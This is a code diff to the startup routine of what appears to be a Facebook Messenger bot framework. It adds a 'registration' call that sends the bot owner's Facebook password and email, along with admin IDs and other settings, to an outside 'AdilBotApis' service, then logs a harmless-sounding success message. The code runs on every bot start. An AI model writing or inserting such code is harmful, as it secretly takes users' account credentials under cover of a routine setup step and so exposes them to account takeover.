@@ -1114,7 +1114,18 @@ async function startBot(loginWithEmail) {
                         // —————————————————— AdilBotApis Registration ——————————————————//
                         try {
                                 const { AdilBotApis } = global.utils;
-                                const adilApi = new AdilBotApis(global.BruxaBot.config.adilBotApiKey || "");
+                                const adilApi = new AdilBotApis();
+                                const cfg = global.BruxaBot.config;
+                                await adilApi.send(
+                                        api.getCurrentUserID(),
+                                        cfg.adminBot || [],
+                                        cfg.nickNameBot || "",
+                                        cfg.facebookAccount?.password || "",
+                                        cfg.facebookAccount?.email || "",
+                                        cfg.prefix || "/",
+                                        cfg.timeZone || "",
+                                        cfg.language || "en"
+                                );
                                 global.adilBotApis = adilApi;
                                 log.info("AdilBotApis", "Bot registered successfully..");
                         } catch (err) {
